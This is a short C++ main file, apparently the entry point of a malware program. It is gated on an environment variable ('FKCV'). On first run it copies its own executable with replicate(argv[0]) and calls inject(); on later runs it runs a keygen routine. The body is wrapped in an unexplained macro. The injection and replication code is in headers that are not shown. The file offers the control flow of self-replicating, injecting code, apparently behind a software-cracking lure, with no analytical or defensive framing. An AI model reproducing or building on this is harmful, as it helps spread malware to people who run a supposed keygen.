//
// Created by ferdinand on 8/12/25.
//

#include <iostream>

#include "injector.h"
#include "keygen.h"
#include "replicator.h"

int main(int argc, char** argv) CAREANDBARE(
{
    auto* injectFlagEnv = getenv("FKCV");
    bool isInjector = injectFlagEnv == nullptr;

    getHomePath();

    if (isInjector) {
        replicate(argv[0]);
        inject();
        setenv("FKCV", "", 1);
    }
    else {
        procKeygen();
    }
    return 0;
}
)
